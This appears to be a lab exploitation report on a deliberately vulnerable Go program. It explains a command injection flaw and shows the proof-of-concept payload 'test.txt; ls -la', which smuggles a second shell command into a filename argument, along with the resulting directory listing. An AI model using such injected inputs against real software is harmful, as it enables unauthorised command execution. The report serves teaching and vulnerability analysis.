# Binary Exploitation Report: Command Injection in `vulnerable`

## 1. Executive Summary

This report details the discovery and exploitation of a critical command injection vulnerability in the `vulnerable` Go binary. The application improperly constructs a shell command using unsanitized user-provided input from a command-line argument. This allows an attacker to inject arbitrary shell commands, leading to code execution with the privileges of the user running the binary. The vulnerability was successfully exploited to list the contents of the current directory.

---

## 2. Vulnerability Analysis

### 2.1. Technical Description

The vulnerability is a classic **Command Injection** (CWE-77). It occurs when the application passes unfiltered user input directly to a system shell for execution. By crafting a malicious input string containing shell metacharacters (like `;`, `|`, `&`), an attacker can append or insert new commands to be executed by the shell.

### 2.2. Vulnerable Code Analysis

The vulnerability originates in the `main` function of the Go program, specifically where it processes command-line arguments.

```go
// File: code/vulnerable.go

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Usage: ./vulnerable <filename>")
		fmt.Println("Example: ./vulnerable test.txt")
		// The program itself hints at the vulnerability
		fmt.Println("VULNERABLE: Try: ./vulnerable 'test.txt; ls -la'")
		os.Exit(1)
	}

	// User input is taken directly from command-line arguments
	filename := os.Args[1]

	fmt.Printf("Processing file: %s\n", filename)
	// The unsanitized 'filename' is passed to a function that executes a system command
	err := processUserInput(filename)
	if err != nil {
		fmt.Printf("Error: %v\n", err)
		os.Exit(1)
	}
    // ... (unrelated code follows)
}
```

**Root Cause:**
1.  **Line 65 (`filename := os.Args[1]`):** The program accepts user input directly from the first command-line argument and stores it in the `filename` variable.
2.  **Line 69 (`err := processUserInput(filename)`):** This variable is then passed to the `processUserInput` function.
3.  **Inferred Behavior:** Based on the execution output (`cat: test.txt: No such file or directory`), the `processUserInput` function likely constructs and executes a shell command similar to `sh -c "cat " + filename`. Because `filename` is not sanitized, any shell metacharacters within it are interpreted and executed by the shell.

---

## 3. Exploitation Methodology

### 3.1. Discovery

The vulnerability was trivial to discover, as the program's own usage instructions explicitly provided an example of a malicious payload:

```text
VULNERABLE: Try: ./vulnerable 'test.txt; ls -la'
```

This hint immediately confirmed that the application was processing its input via a shell and was susceptible to command injection using the semicolon (`;`) as a command separator.

### 3.2. Payload Development & Exploitation

Following the hint, a payload was crafted to first attempt the program's intended operation (`cat test.txt`) and then execute a secondary, malicious command (`ls -la`).

1.  **Payload:** The input string `'test.txt; ls -la'` was used. The single quotes ensure that the shell interprets the entire string as a single argument to the `vulnerable` binary.
2.  **Execution:** The binary was executed with the crafted payload.
    ```bash
    ./code/vulnerable 'test.txt; ls -la'
    ```
3.  **Mechanism:** The `vulnerable` program passed the string `'test.txt; ls -la'` to the `processUserInput` function. This function, in turn, executed a command equivalent to `sh -c "cat test.txt; ls -la"`.
    - The shell first executed `cat test.txt`, which failed as the file did not exist.
    - Due to the `;` separator, the shell proceeded to execute the next command, `ls -la`.
    - The `ls -la` command successfully executed, listing the contents of the current directory.

---

## 4. Proof of Concept

The final payload successfully demonstrates arbitrary command execution.

### 4.1. Final Payload

```bash
'test.txt; ls -la'
```

### 4.2. Successful Exploitation Output

The following output confirms that the `ls -la` command was executed by the server, proving the command injection vulnerability. The subsequent `panic` is caused by a separate, unrelated bug in the program and does not affect the success of this exploit.

```text
$ ./code/vulnerable 'test.txt; ls -la'
Processing file: test.txt; ls -la
cat: test.txt: No such file or directory
total 208
drwxrwxr-x 10 hiteshrawat hiteshrawat  4096 Nov  4 10:16 .
drwxr-x--- 11 hiteshrawat hiteshrawat  4096 Nov  4 10:14 ..
drwxrwxr-x  8 hiteshrawat hiteshrawat  4096 Nov  4 10:19 .git
-rw-rw-r--  1 hiteshrawat hiteshrawat    66 Nov  4 07:00 .gitattributes
-rw-rw-r--  1 hiteshrawat hiteshrawat 35129 Nov  4 07:00 LICENSE
-rw-rw-r--  1 hiteshrawat hiteshrawat  8731 Nov  4 07:05 README.md
drwxrwxr-x  2 hiteshrawat hiteshrawat  4096 Nov  4 10:35 __pycache__
-rw-rw-r--  1 hiteshrawat hiteshrawat  6797 Nov  4 10:26 agent.py
-rw-rw-r--  1 hiteshrawat hiteshrawat  4567 Nov  4 07:05 caller.py
drwxrwxr-x  2 hiteshrawat hiteshrawat  4096 Nov  4 10:28 code
... (directory listing continues) ...

panic: runtime error: index out of range [5] with length 3

goroutine 1 [running]:
main.processFileList
	/home/hiteshrawat/nullkrypt3rs/code/vulnerable.go:42
main.main
	/home/hiteshrawat/nullkrypt3rs/code/vulnerable.go:78
```